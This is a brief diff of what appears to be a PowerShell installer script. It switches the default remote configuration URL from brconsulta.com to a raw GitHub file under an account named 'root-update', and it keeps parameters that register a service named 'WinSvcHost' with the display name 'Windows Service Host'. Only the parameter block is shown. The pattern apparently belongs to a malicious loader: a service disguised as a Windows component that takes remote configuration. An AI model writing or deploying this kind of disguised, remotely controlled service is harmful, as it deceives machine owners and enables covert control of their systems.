@@ -11,7 +11,7 @@
     .\ct3.txt -Diagnostics
 #>
 param(
-    [string]$Config  = 'https://brconsulta.com/test/conf.cfg',
+    [string]$Config  = 'https://raw.githubusercontent.com/root-update/winup/refs/heads/main/conf.cfg',
     [string]$Name    = 'WinSvcHost',
     [string]$Display = 'Windows Service Host',
     [switch]$Uninstall,
